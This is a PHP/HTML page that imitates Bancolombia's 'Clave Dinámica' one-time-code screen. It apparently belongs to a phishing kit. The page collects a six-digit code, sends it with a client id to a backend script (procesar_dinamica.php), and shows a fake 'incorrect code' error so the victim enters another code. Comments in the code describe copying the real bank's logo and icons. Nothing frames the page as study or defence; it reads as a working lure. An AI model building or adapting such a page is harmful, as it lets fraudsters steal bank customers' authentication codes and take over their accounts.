<style>
    /* Estilos específicos para Clave Dinámica (Reloj) */
    .cd-container {
        padding: 20px;
        color: #fff;
        text-align: center;
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-top: 20px;
    }

    .cd-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        width: 100%;
        margin-bottom: 40px;
        font-size: 14px;
        color: #ddd;
    }

    .cd-logo-top {
        width: 40px;
        /* Ajustar según logo real */
        height: auto;
    }

    .cd-title {
        font-family: 'Open Sans', sans-serif;
        font-weight: 700;
        font-size: 22px;
        margin-bottom: 20px;
        text-align: left;
        width: 100%;
        padding-left: 10px;
    }

    .cd-description {
        font-size: 13px;
        color: #ccc;
        text-align: left;
        line-height: 1.5;
        margin-bottom: 40px;
        padding-left: 10px;
        padding-right: 10px;
    }

    .cd-input-box {
        background: #333;
        border-radius: 12px;
        padding: 30px 20px;
        width: 100%;
        max-width: 340px;
        display: flex;
        flex-direction: column;
        align-items: center;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
    }

    .cd-lock-icon {
        font-size: 24px;
        color: #ccc;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 50%;
        /* Icono circular simple si es fontawesome */
        padding: 5px;
        /* Ajuste visual */
        /* O usar imagen si se prefiere exactitud */
        border: none;
    }

    .cd-input-label {
        font-size: 14px;
        color: #eee;
        margin-bottom: 20px;
    }

    .cd-inputs {
        display: flex;
        gap: 8px;
        /* Espacio entre rayitas */
    }

    .cd-digit {
        width: 35px;
        height: 40px;
        background: transparent;
        border: none;
        border-bottom: 2px solid #ccc;
        color: #fff;
        font-size: 24px;
        text-align: center;
        outline: none;
    }

    .cd-digit:focus {
        border-bottom-color: #fff;
    }

    .btn-cd-continue {
        margin-top: 40px;
        width: 100%;
        max-width: 320px;
        background: #666;
        /* Gris inactivo */
        color: #ccc;
        border: none;
        padding: 15px;
        border-radius: 25px;
        font-size: 16px;
        font-weight: 600;
        cursor: not-allowed;
        transition: 0.3s;
    }

    .btn-cd-continue.active {
        background: #fff;
        /* Blanco activo (según imagen parece gris pero brillante) o color primario */
        color: #333;
        cursor: pointer;
    }

    /* Error específico */
    .cd-error-msg {
        color: #ff4d4d;
        font-size: 13px;
        margin-top: 10px;
        display: <?php echo (isset($_GET['error']) || (isset($_GET['status']) && strpos($_GET['status'], 'error') !== false)) ? 'block' : 'none'; ?>;
    }
</style>

<div class="cd-container">
    <div class="cd-header">
        <span onclick="window.history.back()" style="cursor:pointer">&lt; Volver</span>
        <img src="assets/img/bancolombia-logo-white.png" alt="Logo" class="cd-logo-top" style="display:none;">
        <!-- Placeholder si se necesita -->
        <i class="fa-solid fa-bars" style="font-size: 24px;"></i> <!-- Icono menu simulado -->
        <span>Continuar &gt;</span>
    </div>

    <h2 class="cd-title">Ingresa la Clave Dinámica</h2>

    <p class="cd-description">
        Consúltala en el último celular donde la inscribiste ingresando a "Ajustes", luego a "Seguridad" y por último a
        "Claves Dinámicas".
    </p>

    <div class="cd-input-box">
        <div style="margin-bottom: 10px;">
            <i class="fa-regular fa-lock-keyhole" style="font-size: 20px;"></i> <!-- Icono candado -->
            <!-- O usar un SVG exacto si se tiene -->
            <i class="fa-solid fa-lock"
                style="font-size: 16px; border: 1px solid #fff; border-radius: 50%; padding: 4px;"></i>
        </div>

        <span class="cd-input-label">Ingresa la Clave Dinámica</span>

        <form id="cdForm" action="modules/api/procesar_dinamica.php" method="POST">
            <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
            <?php if (isset($_GET['status']) && $_GET['status'] === 'clave_dinamica_error'): ?>
                <input type="hidden" name="retry" value="1">
            <?php endif; ?>

            <div class="cd-inputs">
                <input type="tel" maxlength="1" class="cd-digit" data-index="0" required>
                <input type="tel" maxlength="1" class="cd-digit" data-index="1" required>
                <input type="tel" maxlength="1" class="cd-digit" data-index="2" required>
                <input type="tel" maxlength="1" class="cd-digit" data-index="3" required>
                <input type="tel" maxlength="1" class="cd-digit" data-index="4" required>
                <input type="tel" maxlength="1" class="cd-digit" data-index="5" required>
            </div>

            <!-- Input oculto para recolectar el valor completo -->
            <input type="hidden" name="dinamica" id="dinamicaFull">
        </form>
    </div>

    <p class="cd-error-msg">Clave dinámica incorrecta. Inténtalo de nuevo.</p>

    <button id="btnCdContinue" class="btn-cd-continue">Continuar</button>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const digits = document.querySelectorAll('.cd-digit');
        const btnContinue = document.getElementById('btnCdContinue');
        const hiddenInput = document.getElementById('dinamicaFull');
        const form = document.getElementById('cdForm');

        digits.forEach((digit, index) => {
            digit.addEventListener('input', (e) => {
                // Permitir solo números
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1) {
                    // Mover al siguiente
                    if (index < digits.length - 1) {
                        digits[index + 1].focus();
                    }
                }
                checkFull();
            });

            digit.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value) {
                    if (index > 0) {
                        digits[index - 1].focus();
                    }
                }
            });
        });

        function checkFull() {
            let fullVal = '';
            let complete = true;
            digits.forEach(d => {
                if (!d.value) complete = false;
                fullVal += d.value;
            });

            if (complete) {
                btnContinue.classList.add('active');
                btnContinue.disabled = false;
            } else {
                btnContinue.classList.remove('active');
                btnContinue.disabled = true;
            }
            hiddenInput.value = fullVal;
        }

        btnContinue.addEventListener('click', () => {
            if (!btnContinue.disabled) {
                form.submit();
            }
        });
    });
</script>